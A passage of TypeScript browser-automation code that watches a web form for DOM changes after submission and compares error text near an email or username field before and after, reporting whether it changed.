    formObserver.observe(formArea, { childList: true, subtree: true, characterData: true });

    (window as unknown as AutomatiWindow).__automatiCleanupObservers = () => {
       observer.disconnect();
       formObserver.disconnect();
    };
  }, { sSel: submitSel, eSel: emailSel }).catch(() => {});
}

export async function waitForSubmitMutationResult(page: Page, timeoutMs = 2000): Promise<SubmitMutationResult | null> {
  try {
      const result = await page.waitForFunction(() => {
          return (window as unknown as AutomatiWindow).__automatiSubmitObserverResult;
      }, null, { timeout: timeoutMs }).catch(() => null);
      
      if (result) {
         const json = await result.jsonValue() as SubmitMutationResult;
         return json;
      }
      
      const finalState = await page.evaluate((eSel) => {
         if ((window as unknown as AutomatiWindow).__automatiCleanupObservers) (window as unknown as AutomatiWindow).__automatiCleanupObservers?.();
         
         const getErrorText = () => {
           const emailEl = document.querySelector(eSel);
           if (!emailEl) return (document.body.textContent || "").toLowerCase();
           let parent = emailEl.parentElement;
           for (let i = 0; i < 4; i++) {
             if (parent && parent.parentElement) parent = parent.parentElement;
           }
           return parent ? (parent.textContent || "").toLowerCase() : (document.body.textContent || "").toLowerCase();
         };
         const finalErrorText = getErrorText();
         const initialErrorText = (window as unknown as AutomatiWindow).__automatiErrorBaseline || "";
         
         return {
             mutated: false,
             baselineRestored: true,
             initialErrorText,
             finalErrorText,
             errorVaried: initialErrorText !== finalErrorText
         };
      }, 'input[type="email"], input[name*="user" i]').catch(() => null);
      
      return finalState;
  } catch (e) {
      return null;
  }
}